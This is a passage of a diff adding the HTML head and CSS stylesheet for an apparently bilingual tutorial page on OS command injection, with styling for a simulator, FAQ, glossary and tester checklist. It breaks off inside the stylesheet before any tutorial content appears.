@@ -1,0 +1,2508 @@
+<!DOCTYPE html>
+<html lang="hi" data-theme="dark" data-lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OS Command Injection — Problem Se Solution Tak</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&family=Poppins:wght@700&display=swap" rel="stylesheet">
+<style>
+  :root[data-theme="dark"] {
+    --bg:#050810;
+    --panel:#0F1524;
+    --panel-2:#1A2338;
+    --border:#263049;
+    --text:#E7ECF5;
+    --text-muted:#8B96AB;
+    --danger:#FF6B5B;
+    --danger-bg:rgba(255,107,91,0.12);
+    --safe:#3ECF8E;
+    --safe-bg:rgba(62,207,142,0.12);
+    --accent:#FFC857;
+    --accent-bg:rgba(255,200,87,0.14);
+    --radius:12px;
+    --mono:'IBM Plex Mono',ui-monospace,monospace;
+    --sans:'IBM Plex Sans',system-ui,sans-serif;
+    --glow: rgba(77, 158, 255, 0.05);
+    --blue: #38bdf8;
+    --blue-bg: rgba(56, 189, 248, 0.14);
+  }
+
+  :root[data-theme="light"] {
+    --bg:#F4F7FB;
+    --panel:#FFFFFF;
+    --panel-2:#E8EEF5;
+    --border:#D1D9E6;
+    --text:#0F172A;
+    --text-muted:#475569;
+    --danger:#E11D48;
+    --danger-bg:rgba(225,29,72,0.12);
+    --safe:#059669;
+    --safe-bg:rgba(5,150,105,0.12);
+    --accent:#D97706;
+    --accent-bg:rgba(217,119,6,0.14);
+    --radius:12px;
+    --mono:'IBM Plex Mono',ui-monospace,monospace;
+    --sans:'IBM Plex Sans',system-ui,sans-serif;
+    --glow: rgba(77, 158, 255, 0.05);
+    --blue: #0284c7;
+    --blue-bg: rgba(2, 132, 199, 0.12);
+  }
+
+  html[data-lang="hi"] .lang-en { display: none !important; }
+  html[data-lang="en"] .lang-hi { display: none !important; }
+
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    background:var(--bg);color:var(--text);font-family:var(--sans);
+    margin:0;padding:0;line-height:1.7;-webkit-font-smoothing:antialiased;
+    transition: background-color 0.3s, color 0.3s;
+    background-image: 
+      radial-gradient(circle at 15% 50%, var(--glow), transparent 25%),
+      radial-gradient(circle at 85% 30%, var(--glow), transparent 25%);
+  }
+  ::selection{background:var(--accent-bg);color:var(--accent);}
+  strong{color:var(--text);font-weight:600;}
+
+  code{
+    font-family:var(--mono);background:var(--panel-2);border:1px solid var(--border);
+    padding:2px 6px;border-radius:6px;font-size:0.88em;color:var(--accent);
+    transition: all 0.2s;
+  }
+  code:hover { background: var(--accent-bg); border-color: var(--accent); }
+
+  pre{
+    background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);
+    padding:40px 18px 18px 18px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;
+    line-height:1.6;color:var(--text);margin:18px 0; position: relative;
+    box-shadow: 0 10px 30px -10px rgba(0,0,0,0.2);
+  }
+  pre::before {
+    content: ''; position: absolute; top: 14px; left: 16px;
+    width: 10px; height: 10px; border-radius: 50%;
+    background: var(--danger); box-shadow: 16px 0 0 var(--accent), 32px 0 0 var(--safe);
+  }
+  pre code{background:none;border:none;padding:0;color:inherit; box-shadow: none;}
+  pre code:hover { background: none; border: none; }
+
+  .topbar{
+    position:sticky;top:0;z-index:50;background:rgba(15, 21, 36, 0.7);
+    backdrop-filter:blur(16px); -webkit-backdrop-filter:blur(16px);
+    border-bottom:1px solid var(--border);
+    padding:14px 20px;display:flex;align-items:center;justify-content:space-between;
+    gap:12px;flex-wrap:wrap; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+  }
+  :root[data-theme="light"] .topbar { background:rgba(255, 255, 255, 0.8); }
+
+  .brand{
+    font-family:var(--mono);font-weight:700;font-size:15.5px;
+    display:flex;align-items:center;gap:10px;cursor:default;
+  }
+  .brand-icon { font-size: 19px; display: inline-block; animation: shield-pulse 2.5s infinite ease-in-out; }
+  .brand-text {
+    background: linear-gradient(90deg, var(--accent), var(--safe));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 0.5px;
+  }
+  .brand-text code { background: none; border: none; padding: 0; color: inherit; font-size: 1em; box-shadow: none;}
+  .brand:hover .brand-text { filter: drop-shadow(0 0 10px rgba(62, 207, 142, 0.5)); }
+  @keyframes shield-pulse { 0%, 100% { transform: scale(1); filter: drop-shadow(0 0 3px var(--safe)); } 50% { transform: scale(1.15); filter: drop-shadow(0 0 10px var(--safe)); } }
+
+  .controls-wrapper { display: flex; align-items: center; gap: 15px; flex-wrap: wrap; }
+
+  .theme-toggle {
+    background: var(--panel); border: 1px solid var(--border); color: var(--text);
+    padding: 6px 14px; border-radius: 20px; cursor: pointer; font-weight: 600;
+    font-family: var(--sans); font-size: 12px; transition: all 0.2s ease;
+  }
+  .theme-toggle:hover { border-color: var(--accent); background: var(--accent-bg); color: var(--accent); transform: translateY(-1px); }
+
+  .lang-switch-wrapper {
+    display: flex; align-items: center; gap: 6px; font-family: var(--sans);
+    font-size: 12px; font-weight: 600; color: var(--text); background: var(--panel);
+    padding: 6px 12px; border-radius: 20px; border: 1px solid var(--border);
+  }
+  .lang-active { color: var(--accent); text-shadow: 0 0 8px var(--accent-bg); } 
+  .lang-inactive { color: var(--text-muted); }
+  .switch { position: relative; display: inline-block; width: 32px; height: 18px; margin: 0 4px;}
+  .switch input { opacity: 0; width: 0; height: 0; }
+  .slider {
+    position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
+    background-color: var(--border); transition: .4s; border-radius: 20px;
+  }
+  .slider:before {
+    position: absolute; content: ""; height: 12px; width: 12px; left: 3px; bottom: 3px;
+    background-color: var(--text); transition: .4s; border-radius: 50%;
+  }
+  input:checked + .slider { background-color: var(--accent); }
+  input:checked + .slider:before { transform: translateX(14px); background-color: #fff; }
+
+  main{max-width:840px;margin:0 auto;padding:0 20px 20px; position: relative; z-index: 1;}
+
+  .hero{padding:50px 0 40px; position: relative; border-bottom: 1px solid var(--border); margin-bottom: 40px;}
+  .hero::after {
+    content: ''; position: absolute; top: -50px; left: 50%; transform: translateX(-50%);
+    width: 100vw; height: 100%; background: radial-gradient(ellipse at top, var(--safe-bg), transparent 60%);
+    z-index: -1; pointer-events: none; opacity: 0.5;
+  }
+  .eyebrow{
+    font-family:var(--mono);font-size:12px;letter-spacing:.14em;color:var(--danger);
+    text-transform:uppercase;margin:0 0 16px;display:flex;align-items:center;gap:8px;
+  }
+  .eyebrow::before{content:"●";font-size:9px; animation: blink 1s infinite alternate;}
+  h1.title{
+    font-family:var(--mono);font-weight:700;font-size:clamp(22px,4.5vw,34px);
+    line-height:1.45;margin:0 0 28px;color:var(--text);letter-spacing:-0.01em; text-align: justify;
+  }
+
+  .terminal{
+    background:var(--panel);border:1px solid var(--border);border-radius:12px;overflow:hidden;
+    box-shadow:0 10px 30px -10px rgba(0,0,0,0.3); margin-bottom: 24px;
+  }
+  .terminal-bar{display:flex;align-items:center;gap:7px;padding:12px 16px;border-bottom:1px solid var(--border);background:#11141a;}
+  .terminal-dot{width:10px;height:10px;border-radius:50%;background:#3A4460;}
+  .terminal-dot:nth-child(1){background:#FF5F56;}
+  .terminal-dot:nth-child(2){background:#FFBD2E;}
+  .terminal-dot:nth-child(3){background:#27C93F;}
+  .terminal-label{margin-left:8px;font-family:var(--mono);font-size:11.5px;color:var(--text-muted);}
+  .terminal-body{padding:24px 22px 26px;font-family:var(--mono);font-size:14px;color:var(--text);min-height:120px; line-height: 1.6; text-align: justify;}
+  .terminal-body .prompt{color:var(--safe);}
+  .terminal-body .cursor{display:inline-block;width:8px;height:16px;background:var(--accent);vertical-align:middle;margin-left:2px;animation:blink 1s step-end infinite;}
+  @keyframes blink{50%{opacity:0;}}
+
+  .intro-block {
+    margin-top: 28px; padding: 22px 24px;
+    background: linear-gradient(135deg, var(--panel) 0%, transparent 100%);
+    border: 1px solid var(--border); border-left: 4px solid var(--accent);
+    border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.08);
+    position: relative; overflow: hidden;
+  }
+  .intro-block::after {
+    content:''; position:absolute; right:-20px; bottom:-20px; width:100px; height:100px;
+    background: radial-gradient(circle, var(--accent-bg) 0%, transparent 70%); pointer-events: none;
+  }
+  .intro-block p{margin:0 0 14px;font-size:15px;color:var(--text); text-align: justify; line-height: 1.7;}
+  .intro-block p:last-child{margin-bottom:0;}
+  .intro-block .roadmap{font-family:var(--mono);font-size:13.5px;color:var(--accent); font-weight: 500;}
+
+  .hero-cta{
+    display:inline-flex;align-items:center;gap:10px;margin-top:26px;
+    font-family:var(--mono);font-size:14px;font-weight: 600; color:var(--accent);background:var(--panel);
+    border:1px solid var(--accent);padding:14px 24px;border-radius:10px;
+    text-decoration:none;cursor:pointer;transition:all .3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    box-shadow: 0 6px 20px var(--accent-bg);
+  }
+  .hero-cta:hover{background:var(--accent); color: var(--bg); transform: translateY(-4px); box-shadow: 0 10px 25px rgba(255, 200, 87, 0.4);}
+
+  .sec-head{margin:50px 0 10px;}
+  .sec-eyebrow{font-family:var(--mono);font-size:12px;letter-spacing:.15em;color:var(--accent);text-transform:uppercase;margin:0 0 10px; display: flex; align-items: center; gap: 8px;}
+  .sec-eyebrow::after { content: ''; height: 1px; width: 40px; background: var(--accent); opacity: 0.5; }
+  .sec-head h2{
+    font-family:var(--mono);font-size:clamp(20px,4vw,28px);margin:0 0 14px;
+    background: linear-gradient(90deg, var(--text), var(--text-muted));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  .sec-head p{font-size:15px;color:var(--text-muted);margin:0 0 24px;max-width:100%; line-height: 1.6; text-align: justify;}
+
+  .levels{margin-top:30px;display:flex;flex-direction:column;gap:16px;}
+  .level-card{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);scroll-margin-top:90px;overflow:hidden; transition: all 0.3s;}
+  .level-card:hover { border-color: rgba(255,255,255,0.1); box-shadow: 0 8px 25px rgba(0,0,0,0.1); }
+  .level-card.open { border-color: var(--accent); box-shadow: 0 8px 30px var(--accent-bg); }
+
+  .level-header{
+    width:100%;background:none;border:none;color:var(--text);display:flex;align-items:center;
+    gap:16px;padding:18px 20px;cursor:pointer;text-align:left;font-family:var(--sans);
+  }
+  .level-header:focus-visible{outline:2px solid var(--accent);outline-offset:-2px;}
+  .level-badge{
+    font-family:var(--mono);font-weight:700;font-size:16px;width:38px;height:38px;flex:none;
+    border-radius:10px;display:flex;align-items:center;justify-content:center;
+    background:var(--panel-2);border:1px solid var(--border);color:var(--text-muted);
+    transition: all 0.3s;
+  }
+  .level-card.open .level-badge { background: var(--accent-bg); color: var(--accent); border-color: var(--accent); }
+
+  .level-titles{flex:1;min-width:0;}
+  .level-titles h2{margin:0 0 4px;font-size:16.5px;font-weight:600;color:var(--text); transition: color 0.3s;}
+  .level-card.open .level-titles h2 { color: var(--accent); }
+  .level-titles p{margin:0;font-size:13px;color:var(--text-muted);}
+  .level-tag{
+    font-family:var(--mono);font-size:11px;font-weight:600;letter-spacing:.05em;
+    padding:5px 10px;border-radius:20px;white-space:nowrap;flex:none;
+  }
+  .level-tag.problem{background:var(--danger-bg);color:var(--danger); border: 1px solid rgba(255,107,91,0.2);}
+  .level-tag.solved{background:var(--safe-bg);color:var(--safe); border: 1px solid rgba(62,207,142,0.2);}
+  .level-tag.concept{background:var(--accent-bg);color:var(--accent); border: 1px solid rgba(255,200,87,0.2);}
+
+  .chevron{flex:none;color:var(--text-muted);transition:transform .3s ease;font-size:14px;}
+  .level-card.open .chevron{transform:rotate(180deg); color: var(--accent);}
+
+  .level-body{ display: none; }
+  .level-card.open .level-body{ display: block; animation: fadeIn .3s ease; }
+
+  .level-inner{padding:0 20px 24px;font-size:14.8px; border-top: 1px solid var(--border); margin-top: 4px; padding-top: 20px;}
+  .level-inner p{margin:0 0 14px;color:var(--text); text-align: justify; line-height: 1.7;}
+  .level-inner h4{margin:22px 0 10px;font-size:14px;color:var(--accent);font-weight:600;font-family:var(--mono);letter-spacing:.04em; text-transform: uppercase;}
+
+  .callout{
+    border-left:4px solid var(--danger);background:linear-gradient(90deg, var(--danger-bg), transparent);
+    border-radius:0 10px 10px 0;padding:16px 20px;margin:18px 0;font-size:14px;
+    box-shadow: inset 0 0 20px rgba(255,107,91,0.05);
+  }
+  .callout.fixnote{border-left-color:var(--safe);background:linear-gradient(90deg, var(--safe-bg), transparent); box-shadow: inset 0 0 20px rgba(62,207,142,0.05);}
+  .callout.analogy{border-left-color:var(--accent);background:linear-gradient(90deg, var(--accent-bg), transparent); box-shadow: inset 0 0 20px rgba(255,200,87,0.05);}
+  .callout.analogy .cal-label{color:var(--accent);}
+  .callout p{margin:0;color:var(--text); text-align: justify;}
+  .callout p+p{margin-top:10px;}
+  .callout .cal-label{font-family:var(--mono);font-size:12px;font-weight:700;letter-spacing:.06em;display:block;margin-bottom:8px;color:var(--danger);}
+  .callout.fixnote .cal-label{color:var(--safe);}
+
+  .mini-table{width:100%;border-collapse:collapse;margin:14px 0;font-size:13px; background: var(--panel-2); border-radius: 8px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.15);}
+  .mini-table th,.mini-table td{border:1px solid var(--border);padding:12px 14px;text-align:left;}
+  .mini-table th{background:var(--bg);color:var(--accent);font-weight:700;font-family:var(--mono);font-size:12px; text-transform: uppercase; letter-spacing: 0.5px;}
+  .mini-table td{color:var(--text); font-family: var(--mono); font-size: 12.5px;}
+
+  .sim-jump{
+    display:inline-flex;align-items:center;gap:6px;margin-top:4px;font-family:var(--mono);
+    font-size:12px;color:var(--accent);background:var(--accent-bg);
+    border:1px solid rgba(255,200,87,0.3);padding:8px 13px;border-radius:7px;cursor:pointer;text-decoration:none;
+  }
+
+  .item-divider {
+    border: 0; height: 1px; background: linear-gradient(90deg, var(--border) 0%, transparent 100%);
+    margin: 24px 0; opacity: 0.8;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-4px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .simulator-section {
+    background: #050505; border: 1px solid var(--border); border-radius: 14px;
+    margin-top: 30px; margin-bottom: 24px; overflow: hidden; position: relative;
+    display: flex; flex-direction: column; box-shadow: 0 15px 40px rgba(0,0,0,0.4);
+  }
+  .simulator-section::before {
+    content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px;
+    background: linear-gradient(90deg, transparent, #ff3c3c, transparent);
+    animation: scanline 3s linear infinite;
+  }
+  @keyframes scanline { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+
+  .sim-header-bar {
+    background: #0a0c10; border-bottom: 1px solid #1f242d; padding: 18px 24px;
+    display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px;
+  }
+  .sim-title {
+    font-family: var(--font-code); font-size: 16px; font-weight: 700; color: #fff;
+    display: flex; align-items: center; gap: 10px; letter-spacing: 0.5px;
+  }
+  .sim-title span { color: #ff3c3c; animation: pulse-danger 1.5s infinite; border-radius: 50%;}
+  .sim-controls { display: flex; flex-direction: column; gap: 16px; width: 100%; }
+  .sim-control-group { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+  .sim-control-group label {
+    font-family: var(--font-code); font-size: 11.5px; color: #64748b;
+    text-transform: uppercase; letter-spacing: 1px; min-width: 140px; font-weight: bold;
+  }
+  .sim-btn-group { display: flex; gap: 10px; flex-wrap: wrap; background: #000; padding: 4px; border-radius: 6px; border: 1px solid #1f242d;}
+  .sim-btn {
+    background: transparent; border: none; color: #64748b; padding: 6px 14px;
+    border-radius: 4px; font-family: var(--font-code); font-size: 11.5px; font-weight: 600;
+    cursor: pointer; transition: all 0.2s;
+  }
+  .sim-btn:hover { color: #fff; }
+  .sim-btn.active { background: #1f242d; color: #4d9eff; box-shadow: 0 2px 8px rgba(0,0,0,0.5); }
+
+  .btn-execute {
+    background: rgba(57, 255, 122, 0.1); color: #39ff7a; border: 1px solid #39ff7a;
+    padding: 10px 24px; border-radius: 6px; font-family: var(--font-code); font-size: 13px;
+    font-weight: 700; cursor: pointer; transition: all 0.2s; text-transform: uppercase;
+    align-self: flex-start; letter-spacing: 1px; box-shadow: 0 0 15px rgba(57, 255, 122, 0.15);
+  }
+  .btn-execute:hover { background: #39ff7a; color: #000; box-shadow: 0 0 20px rgba(57, 255, 122, 0.4); transform: translateY(-2px); }
+  .btn-execute:active { transform: scale(0.96); }
+  .btn-execute:disabled { opacity: 0.4; cursor: not-allowed; border-color: #536271; color: #536271; background: transparent; box-shadow: none; transform: none;}
+
+  .workspace { display: flex; padding: 18px; gap: 18px; height: 500px; background: #050505; }
+  @media (max-width: 850px) { .workspace { flex-direction: column; height: auto; min-height: 600px; } }
+
+  .sim-panel {
+    flex: 1; background: #0a0c10; border: 1px solid #1f242d; border-radius: 8px;
+    display: flex; flex-direction: column; overflow: hidden; box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
+  }
+  .sim-panel-header {
+    background: #11141a; padding: 10px 14px; font-family: var(--font-code); font-size: 11.5px;
+    font-weight: 700; color: #fff; border-bottom: 1px solid #1f242d; display: flex;
+    align-items: center; gap: 8px; text-transform: uppercase; letter-spacing: 0.5px;
+  }
+  .sim-panel-body {
+    flex: 1; padding: 14px; font-family: var(--font-code); font-size: 12px;
+    line-height: 1.6; overflow-y: auto; background: #000000;
+  }
+
+  #panel-browser .sim-panel-header { border-top: 2px solid #ffcc00; }
+  #panel-network .sim-panel-header { border-top: 2px solid #4d9eff; }
+  #panel-server .sim-panel-header { border-top: 2px solid #39ff7a; }
+
+  .log-line { opacity: 0; transform: translateX(-5px); animation: slideIn 0.2s forwards; margin-bottom: 6px; word-break: break-word; color: #a9b5c2; }
+  .log-stage {
+    font-family: var(--font-code); font-size: 12.5px; color: #ffcc00; font-weight: bold;
+    margin: 20px 0 8px 0; padding-bottom: 4px; border-bottom: 1px dashed #1f242d;
+    display: block; text-transform: uppercase; letter-spacing: 0.5px;
+  }
+  @keyframes slideIn { to { opacity: 1; transform: translateX(0); } }
+  @keyframes slideInUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+
+  .timestamp { color: #536271; margin-right: 10px; user-select: none; }
+  .c-info { color: #8fa0b3; } .c-warn { color: #ffcc00; } .c-err { color: #ff3c3c; } .c-ok { color: #39ff7a; } .c-blue { color: #4d9eff; } .c-gray { color: #64748b; }
+
+  .http-block { background: rgba(255,255,255,0.03); border-left: 2px solid #4d9eff; padding: 10px; margin: 10px 0; border-radius: 0 6px 6px 0; }
+  .http-method { color: #d782ff; font-weight: bold; } .http-path { color: #fff; } .http-proto { color: #64748b; }
+  .http-header-key { color: #6ab0ff; } .http-header-val { color: #9cdb9e; } .http-body { color: #ff9d66; margin-top: 8px; display: block; }
+  .resp-200 { color: #39ff7a; }
+
+  .sim-verdict-box {
+    margin: 0 18px 18px 18px; background: #0d0f12; border: 1px solid #1f242d;
+    padding: 24px; border-radius: 8px; font-family: var(--sans); display: none;
+  }
+  .sim-verdict-box.show { display: block; animation: slideInUp 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+  .sim-verdict-title { font-family: var(--font-code); font-size: 17px; font-weight: 700; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.5px;}
+  .sim-verdict-text { font-size: 15px; color: #e2e8f0; line-height: 1.6; text-align: justify;}
+  .v-hacked { border-color: #ff3c3c; background: rgba(255, 60, 60, 0.08); box-shadow: inset 0 0 30px rgba(255,60,60,0.1); }
+  .v-hacked .sim-verdict-title { color: #ff3c3c; }
+  .v-blocked { border-color: #39ff7a; background: rgba(57, 255, 122, 0.08); box-shadow: inset 0 0 30px rgba(57,255,122,0.1);}
+  .v-blocked .sim-verdict-title { color: #39ff7a; }
+
+  .sim-panel-body::-webkit-scrollbar { width: 6px; }
+  .sim-panel-body::-webkit-scrollbar-track { background: #050505; }
+  .sim-panel-body::-webkit-scrollbar-thumb { background: #2a313d; border-radius: 4px; }
+  .sim-panel-body::-webkit-scrollbar-thumb:hover { background: #4d9eff; }
+
+  .checklist{margin-top:40px;background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:30px 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.1);}
+  .checklist-head{display:flex;align-items:center;gap:12px;margin-bottom:10px;}
+  .checklist-head h2{margin:0;font-size:20px;color:var(--text);font-family:var(--mono);}
+  .checklist-intro{color:var(--text-muted);font-size:14px;margin:0 0 26px;}
+
+  /* ---------- REAL-WORLD IMPACT SECTION ---------- */
+  .impact-section {
+    background: linear-gradient(145deg, var(--panel), var(--bg));
+    border: 2px solid var(--border);
+    box-shadow: 0 15px 40px rgba(0,0,0,0.15);
+    position: relative; overflow: hidden;
+    padding: 30px 24px; border-radius: 14px; margin-top: 30px; margin-bottom: 24px;
+  }
+  .impact-section::before {
+    content:''; position:absolute; top:0; left:0; width:100%; height:4px;
+    background: linear-gradient(90deg, var(--danger), var(--accent), var(--danger));
+  }
+  .impact-card {
+    background: var(--panel); border: 1px solid var(--border); border-left: 4px solid var(--danger);
+    border-radius: 10px; padding: 18px 20px; margin-bottom: 16px; transition: all 0.3s;
+  }
+  .impact-card:last-child{margin-bottom:0;}
+  .impact-card:hover{ transform: translateX(4px); box-shadow: 0 8px 20px rgba(255,60,60,0.08); border-color: rgba(255,255,255,0.1);}
+  .impact-card h3{ margin:0 0 10px; font-size:14.5px; color:var(--danger); font-family:var(--mono); display:flex; align-items:center; gap:10px; text-transform:uppercase; letter-spacing:0.5px;}
+  .impact-card p{margin:0; font-size:14px; color:var(--text); text-align:justify; line-height:1.7;}
+  .impact-card p+p{margin-top:10px;}
+
+  /* Deep Dive Link Design (Matches other vulnerability notes) */
+  .csp-deep-dive { margin-top: 14px; text-align: left; }
+  .csp-deep-dive a {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: var(--btn-bg, rgba(62, 207, 142, 0.18));
+    color: var(--btn-text, #3ecf8e);
+    border: 1px solid var(--btn-border, rgba(62, 207, 142, 0.45));
+    padding: 6px 14px; border-radius: 20px; font-family: var(--mono); font-weight: 700;
+    font-size: 12px; text-decoration: none; letter-spacing: 0.3px;
+    box-shadow: 0 0 6px var(--btn-glow, rgba(62, 207, 142, 0.2));
+    transition: background-color 0.2s, transform 0.2s, box-shadow 0.2s;
+  }
+  .csp-deep-dive a:hover {
+    background: var(--btn-bg-hover, rgba(62, 207, 142, 0.35));
+    transform: translateY(-1px);
+    box-shadow: 0 0 10px var(--btn-glow-hover, rgba(62, 207, 142, 0.4));
+  }
+  :root[data-theme="light"] .csp-deep-dive a {
+    background: #059669;
+    color: #ffffff;
+    border-color: #047857;
+    box-shadow: 0 0 6px rgba(5, 150, 105, 0.25);
+  }
+  :root[data-theme="light"] .csp-deep-dive a:hover {
+    background: #047857;
+    box-shadow: 0 0 10px rgba(5, 150, 105, 0.4);
+  }
+
+  .faq-section {
+    background: linear-gradient(145deg, var(--panel), var(--bg));
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 30px 24px;
+    margin-top: 40px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+  }
+  .faq-header { margin-bottom: 24px; }
+  .faq-header h2 { font-size: 20px; color: var(--text); font-family: var(--mono); margin: 0 0 10px 0; display: flex; align-items: center; gap: 10px;}
+  .faq-header p { color: var(--text-muted); font-size: 14px; margin: 0; text-align: justify;}
+
+  .faq-list { display: flex; flex-direction: column; gap: 12px; }
+  .faq-item {
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    transition: all 0.3s ease;
+  }
+  .faq-item:hover { border-color: rgba(255,255,255,0.1); }
+  .faq-item.active { border-color: var(--accent); box-shadow: 0 4px 15px var(--accent-bg); }
+
+  .faq-question {
+    width: 100%; text-align: left; background: none; border: none;
+    padding: 16px 20px; display: flex; align-items: center; gap: 14px;
+    cursor: pointer; color: var(--text); font-family: var(--sans); font-size: 14.5px;
+    transition: all 0.2s ease;
+  }
+  .faq-question:focus-visible { outline: 2px solid var(--accent); outline-offset: -2px; }
+  .faq-q-badge {
+    font-family: var(--mono); color: var(--accent); font-weight: 700;
+    background: var(--bg); padding: 4px 8px; border-radius: 6px;
+    font-size: 13px; flex-shrink: 0; border: 1px solid var(--border);
+  }
+  .faq-item.active .faq-q-badge { background: var(--accent-bg); border-color: var(--accent); }
+  .faq-q-text { flex: 1; line-height: 1.5; font-weight: 500; }
+  .faq-icon { color: var(--text-muted); transition: transform 0.3s ease; font-size: 12px; }
+  .faq-item.active .faq-icon { transform: rotate(180deg); color: var(--accent); }
+
+  .faq-answer {
+    display: none; padding: 0 20px 20px; border-top: 1px solid var(--border);
+    margin-top: 4px; padding-top: 16px; 
+    color: var(--text-muted);
+    font-family: var(--mono);
+    font-size: 13.5px;
+    line-height: 1.7; text-align: justify;
+  }
+  .faq-item.active .faq-answer { display: block; animation: fadeIn 0.3s ease; }
+
+  /* ---------- GLOSSARY (static, non-collapsible, same container style as FAQ) ---------- */
+  .glossary-item {
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px 20px;
+    transition: all 0.3s ease;
+  }
+  .glossary-item:hover { border-color: rgba(255,255,255,0.1); }
+  .glossary-term {
+    font-family: var(--mono); font-weight: 700; color: var(--accent);
+    font-size: 14.5px; margin-bottom: 8px; display: flex; align-items: center; gap: 10px;
+  }
+  .glossary-term .glossary-badge {
+    font-family: var(--mono); color: var(--accent); font-weight: 700;
+    background: var(--bg); padding: 3px 8px; border-radius: 6px;
+    font-size: 12px; flex-shrink: 0; border: 1px solid var(--border);
+  }
+  .glossary-def {
+    color: var(--text-muted); font-family: var(--mono); font-size: 13.5px;
+    line-height: 1.7; text-align: justify; padding-top: 10px; border-top: 1px solid var(--border);
+  }
+
+  #tester-checklist {
+    background: linear-gradient(145deg, var(--panel), var(--bg));
+    border: 2px solid var(--border);
+    box-shadow: 0 15px 40px rgba(0,0,0,0.15);
+    position: relative;
+    overflow: hidden;
+    padding: 30px 24px;
+    border-radius: 14px;
+    margin-top: 40px;
+  }
+  #tester-checklist::before {
+    content:''; position:absolute; top:0; left:0; width:100%; height:4px;
+    background: linear-gradient(90deg, var(--safe), var(--accent), var(--danger));
+  }
+  .audit-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px 22px;
+    margin-bottom: 18px;
+    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    position: relative;
+    z-index: 1;
+  }
+  .audit-card:last-child { margin-bottom: 0; }
+  .audit-card:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+    border-color: rgba(255,255,255,0.1);
+  }
+  .audit-card h3 {
+    margin: 0 0 18px 0; font-size: 15.5px; color: var(--safe); font-family: var(--mono);
+    display: flex; align-items: center; gap: 10px; text-transform: uppercase; letter-spacing: 0.5px;
+  }
+
+  .check-list { display: flex; flex-direction: column; gap: 12px; }
+  .check-label {
+    display: flex; align-items: flex-start; gap: 14px;
+    cursor: pointer; padding: 12px 14px; border-radius: 8px;
+    transition: background 0.2s ease, transform 0.2s ease;
+    border: 1px solid transparent;
+  }
+  .check-label:hover { background: var(--panel-2); border-color: var(--border); transform: translateX(4px); }
+  .check-input { display: none; }
+  .check-box {
+    width: 20px; height: 20px; border: 2px solid var(--text-muted);
+    border-radius: 5px; flex-shrink: 0; margin-top: 2px;
+    display: flex; align-items: center; justify-content: center;
+    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    background: var(--bg);
+  }
+  .check-input:checked + .check-box { background: var(--safe); border-color: var(--safe); transform: rotate(360deg); }
+  .check-input:checked + .check-box::after { content: '✔'; color: white; font-size: 13px; font-weight: bold; }
+  .check-text { color: var(--text); font-size: 14px; line-height: 1.6; transition: all 0.3s ease; text-align: justify; flex: 1; }
+  .check-input:checked ~ .check-text { color: var(--text-muted); text-decoration: line-through; opacity: 0.6; }
+
+  .summary-wrap { overflow-x: auto; border: 1px solid var(--border); border-radius: 12px; background: var(--panel); box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+  table.summary-table { width: 100%; border-collapse: collapse; min-width: 600px; }
+  table.summary-table th { background: var(--panel-2); color: var(--text-muted); padding: 14px 20px; text-align: left; font-family: var(--mono); font-size: 12.5px; text-transform: uppercase; border-bottom: 1px solid var(--border); }
+  table.summary-table td { padding: 14px 20px; border-bottom: 1px solid var(--border); font-size: 14px; color: var(--text); }
+  table.summary-table tr:hover td { background: rgba(255,255,255,0.02); }
+  table.summary-table td:first-child { color: var(--accent); font-family: var(--mono); font-weight: 600; }
+
+    /* ── Designed and Developed by Footer ── */
+  .modern-footer { padding: 40px 18px 30px; text-align: center; position: relative; z-index: 1; }
+  .footer-badge {
+    display: inline-flex; align-items: center; gap: 10px;
+    background: linear-gradient(145deg, var(--panel-2), var(--panel));
+    padding: 12px 28px; border-radius: 30px; font-family: var(--mono); font-size: 13.5px;
+    color: var(--text-muted); border: 1px solid var(--border);
+    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.25); cursor: default;
+  }
+  .footer-badge:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 12px 30px rgba(239, 68, 68, 0.25);
+    border-color: var(--danger);
+    color: var(--text);
+  }
+  .dev-name {
